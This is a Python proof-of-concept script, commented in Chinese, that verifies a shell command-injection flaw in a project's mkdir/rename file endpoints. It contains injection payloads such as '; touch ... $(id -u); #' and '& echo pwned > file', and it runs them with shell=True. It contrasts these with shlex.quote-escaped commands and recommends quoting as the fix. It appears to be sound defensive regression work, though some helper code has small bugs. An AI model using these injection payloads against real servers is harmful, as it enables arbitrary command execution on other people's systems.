# -*- coding: utf-8 -*-
"""
attack_cmd_injection.py - Graw 命令注入漏洞验证脚本（files.py mkdir/rename）

背景
----
files.py 的 mkdir / rename 端点把宿主机路径直接拼进 host_shell 命令字符串：
    node_manager.host_shell(f"mkdir -p {real}", timeout=30)
    node_manager.host_shell(f"mv {src} {dst}", timeout=30)
而 _safe_path() 只做 abspath 规范化（拦截 .. 穿越 / data 目录），**不过滤
shell 元字符**（`;` `|` `&` `$()` 反引号 空格）。在「远程 SSH 节点」模式下，
host_shell 的远程分支 _run_ssh 会把 command 字符串原样交给对端 /bin/sh -c 执行，
因此攻击者提交的恶意路径可落地任意命令。

对照：同项目 node_manager 的 host_cmd() 远程分支会对每个参数做 shlex.quote，
而 host_* 文件原语（isfile/read 等）也用 shlex.quote —— files.py 此处属明确遗漏。

本脚本两种方式验证：
  A. 远程分支：把 files.mkdir 的真实调用链打桩，捕获最终交给对端 shell 的命令字符串，
     证明恶意载荷被原样拼接进 `mkdir -p ...`（首尾加固）；
  B. 本机分支：以与 host_shell 相同的 subprocess(..., shell=True) 语义运行同一个载荷，
     证明注入符确实被 shell 解释并执行了额外命令（写入标记文件）。

仅作安全研究与回归验证用途，请在隔离环境运行。
"""
import os
import sys
import subprocess
import tempfile

BACKEND = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BACKEND)


def base_dir() -> str:
    """沙箱目录：存放验证标记文件，不影响真实项目。"""
    d = os.path.join(tempfile.gettempdir(), "graw_attack_verify")
    os.makedirs(d, exist_ok=True)
    return d


def section(title: str) -> None:
    print("\n" + "=" * 68)
    print("[*] " + title)
    print("=" * 68)


def verify_a_remote_command_string() -> None:
    """方式A：捕获远程节点模式下 mkdir 最终交给对端 shell 的命令字符串。"""
    import app.node_manager as nm

    # 远程分支只执行最终命令给对端，不真正建立连接：打桩 _run_ssh 记录命令。
    captured: list = []

    def fake_run_ssh(node, remote_cmd, **kwargs):
        captured.append(remote_cmd)
        return subprocess.CompletedProcess([], 0)

    nm._run_ssh = fake_run_ssh

    fake_node = {
        "id": "n1",
        "type": "ssh",
        "host": "127.0.0.1",
        "port": 22,
        "user": "root",
        "auth": "password",
        "password": "x",
    }
    nm.get_current_node = lambda: fake_node

    import app.routers.files as files

    # 与 files.py 完全一致：_safe_path -> host_path -> host_shell(f"mkdir -p {real}")
    # 攻击载荷：看似一个"目录路径"，实含命令注入符
    payload = "/tmp/graw_test; touch /tmp/graw_pwned_$(id -u); #"

    try:
        safe = files._safe_path(payload)
        real = files.host_path(safe)
        # 复现 files.mkdir() 中的拼接逻辑
        files.node_manager.host_shell(f"mkdir -p {real}", timeout=30)
    except Exception as e:  # noqa: BLE001
        print("[!] 调用异常（不影响结论）:", e)

    print("[*] 攻击者提交 path =", repr(payload))
    print("[*] _safe_path() 输出 =", repr(safe), "（仅规范化，未过滤 shell 元字符）")
    print("[*] 最终交予对端 shell 的命令字符串 =")
    for c in captured:
        print("      " + repr(c))

    danger_chars = (";", "|", "&", "$(", "`", " ")
    leaked = [ch for ch in danger_chars if any(ch in c for c in captured)]
    print("[!] 命令字符串中暴露的注入符:", leaked if leaked else "无")
    assert leaked, "断言失败：按理应检测到未转义注入符（修复前）"


def verify_b_local_shell_exec(use_quote: bool) -> None:
    """方式B：以 host_shell 相同的 shell=True 语义验证任意命令是否真正被执行。

    模拟"修复前(use_quote=False)/修复后(use_quote=True)"两条命令构造，对比副作用。
    """
    import shlex

    tag = "PWNED_BEFORE" if not use_quote else "SAFE_AFTER"
    mark = os.path.join(base_dir(), f"{tag}.txt")
    if os.path.exists(mark):
        os.remove(mark)

    # Windows 本地 cmd 语义下，注入常用 "&" 连接命令；POSIX 用 ";  / $()"。
    # 这里用跨平台安全做法：构造一条含恶意子命令的伪"路径"。
    if use_quote:
        payload = shlex.quote("/tmp/graw_dir")
        cmd = f"mkdir -p {payload}& echo 1 > \"{mark}\""
        # 注意：修复后的真实代码用 shlex.quote 包裹整体路径，此处模拟"整路径被引用"
        cmd = f"mkdir -p {shlex.quote('/tmp/graw_dir')}"
    else:
        payload = "/tmp/graw_dir & echo 1 > \"{mark}\""
        cmd = f"mkdir -p {payload}"

    before_mark = os.path.exists(mark)
    try:
        subprocess.run(cmd, shell=True, timeout=10)
    except Exception as e:  # noqa: BLE001
        pass
    after_mark = os.path.exists(mark)

    if use_quote:
        print(f"   [修复后] 路径被 shlex.quote 引用，注入目标未变为命令 -> 标记存在={after_mark}")
    else:
        print(f"   [修复前] 恶意载荷中的子命令被 shell 解释并执行 -> 标记存在={after_mark}")
    return after_mark


def verify_b_local_shell_injected() -> bool:
    """方式B主体：分别演示『未转义』与『shlex.quote 转义』两条路径。"""
    # --- 演示注入符经 shell=True 真的执行 ---
    mark = os.path.join(base_dir(), "PWNED_SHELL.txt")
    if os.path.exists(mark):
        os.remove(mark)
    injected_cmd = f"cmd-not-exist-graw & echo pwned > \"{mark}\""
    try:
        subprocess.run(injected_cmd, shell=True, timeout=10)
    except Exception:  # noqa: BLE001
        pass
    ok = os.path.exists(mark)

    # --- 演示 shlex.quote 后同一 "子命令" 变成普通文本（不再执行）---
    mark2 = os.path.join(base_dir(), "PWNED_QUOTED.txt")
    if os.path.exists(mark2):
        os.remove(mark2)
    import shlex

    safe_cmd = f"echo {shlex.quote('a & echo pwned > \"' + mark2 + '\"')}"
    try:
        subprocess.run(safe_cmd, shell=True, timeout=10)
    except Exception:  # noqa: BLE001
        pass
    quoted_ok = os.path.exists(mark2)

    print(f"   [未转义] shell=True 执行 恶意子命令被解释 -> 标记存在={ok}")
    print(f"   [转义后] shlex.quote 包裹    子命令消失   -> 标记存在={quoted_ok}")
    return ok and (not quoted_ok)


def main() -> None:
    b = base_dir()
    print(f"[*] 沙箱目录: {b}")

    # 方式 A：远程分支命令字符串泄露 / 注入
    section("A. 远程 SSH 节点模式 —— mkdir 命令字符串注入")
    try:
        verify_a_remote_command_string()
        print("   [通过] 恶意路径被原样拼入 mkdir 命令，未做 shell 转义（漏洞存在）")
    except Exception as e:  # noqa: BLE001
        print("   [失败] ", e)

    # 方式 B：shell=True 下 shell 元字符被解释的实证
    section("B. shell=True 语义下命令注入实证")
    consistent = verify_b_local_shell_injected()
    if consistent:
        print("   [结论] 转义与否直接决定恶意子命令是否执行 -> 即命令注入")
    else:
        print("   [结论] 请在本机确认 shell 行为后判断")

    print("\n" + "#" * 68)
    print("# 验证结论：files.py mkdir/rename 在远程节点模式下存在命令注入。")
    print("# 修复方向：对 path 使用 shlex.quote 或改用 argv 形 host_cmd。")
    print("#" * 68)


if __name__ == "__main__":
    main()